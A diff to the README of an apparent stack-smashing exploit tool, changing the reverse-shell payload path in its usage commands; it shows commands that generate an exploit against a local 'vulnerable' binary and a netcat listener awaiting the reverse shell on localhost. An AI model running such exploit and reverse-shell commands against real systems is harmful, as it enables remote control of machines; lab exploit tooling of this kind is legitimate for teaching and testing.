@@ -42,7 +42,7 @@ Running smasher in *verbose* mode with the prebuild reverse shell (127.0.0.1:133
 ```sh
 cd bin
 chmod +x smasher vulnerable
-./smasher verbose reverse-shell vulnerable
+./smasher verbose payloads/reverse-shell.bin vulnerable
 ```
 
 Example Output:
@@ -74,7 +74,7 @@ nc -lkp 1337
 
 Executing Payload:
 ```sh
-./vulnerable $(./smasher exploit reverse-shell vulnerable)
+./vulnerable $(./smasher exploit payloads/reverse-shell.bin vulnerable)
 ```
 
 ![StackSmasher](https://user-images.githubusercontent.com/31845045/108642265-06a30800-749c-11eb-88bb-40d9aa6c987b.png)
